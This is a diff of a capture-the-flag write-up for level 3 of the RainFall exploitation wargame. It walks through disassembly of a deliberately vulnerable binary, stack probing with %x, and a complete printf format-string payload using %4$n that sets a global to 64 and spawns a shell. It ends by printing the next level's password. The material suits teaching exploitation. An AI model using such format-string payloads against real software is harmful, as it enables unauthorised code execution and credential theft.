@@ -1,8 +1,16 @@
 # Level 3
 
 ```bash 
+GCC stack protector support:            Enabled
+Strict user copy checks:                Disabled
+Restrict /dev/mem access:               Enabled
+Restrict /dev/kmem access:              Enabled
+grsecurity / PaX: No GRKERNSEC
+Kernel Heap Hardening: No KERNHEAP
+System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
+
 ```
 
 ## Testing the program
@@ -66,19 +74,98 @@ Dump of assembler code for function v:
 End of assembler dump.
 ```
 
-There is a call to fgets() function, however it is protected against buffer overflow.
- 
+We see that the value at address 0x804988c is being put in the eax container. 
+This value is then compared to 64 (Ox40 in hexadecimal).
+
 ```bash
-0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+0x080484da <+54>:	mov    0x804988c,%eax
+0x080484df <+59>:	cmp    $0x40,%eax
 ```
-But we can also see a call to printf() function wich is vulnerable to format string exploit!
+
+Using gdb we can check the name of the variable at 0x804988c
+```bash
+(gdb) info variables
+All defined variables:
+[...]
+0x0804988c  m
+```
+
+If it corresponds to 64 a call to system is made.
+
+```bash
+0x08048513 <+111>:	call   0x80483c0 <system@plt>
+```
+
+
+We can also see a call to printf() function wich is vulnerable to exploit.
 
 ```bash
 0x080484d5 <+49>:	call   0x8048390 <printf@plt>
 ```
 
+## Getting the pass
+
+We are going to modify the value of the variable located at 0x804988c so that it equals 64, in order for the program to launch the system to ("bin/sh"). 
+
+
+### Finding where is our input
+
+First we need to know where our input is located on the stack so we can manipulate the addresses later on. 
+
+```bash 
+$ python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' > /tmp/exploit
+$ cat /tmp/exploit | ./level3
+aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
+```
+
+61616161 = "aaaa", in hexadecimal.
+So our input is at the 4th slot (%4$x) in the stack. 
+
+### Injecting m address
+
+We want to write in the address 0x0804988c, so we pass it as little endian at the beginning of our payload. 
+
 ```bash
-   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
-   0x0804850c <+104>:	movl   $0x804860d,(%esp)
-   0x08048513 <+111>:	call   0x80483c0 <system@plt>
+$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit
+$ cat /tmp/exploit | ./level3
+? 200 b7fd1ac0 b7ff37d0 804988c
+```
+
+### Writing into the memory 
+
+%n allows us to write, in an address, the number of characters that have been printed. 
+```bash
+printf("AAAAA%n", addr);
+```
+will write 5 (the number of chars before %n) to addr.
+
+
+### Reaching the 64 value 
+
+We want %n to write 64 in the address 0x804988c.
+
+However we have already 4 characters for the address, so we only need 60 chars to reach the total. 
+
+Final payload : 
+```bash
+$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
+$ cat /tmp/exploit | ./level3
+```
+
+Explanation :
+```plaintext
+\x8c\x98\x04\x08 → adresse de m
+"A" * 60 → padding
+"%4$n" → écrit le total (64) à l'adresse au 4e emplacement dans la stack (notre adresse injectée)
+```
+
+```bash
+python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
+level3@RainFall:~$ cat /tmp/exploit - | ./level3
+?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami 
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
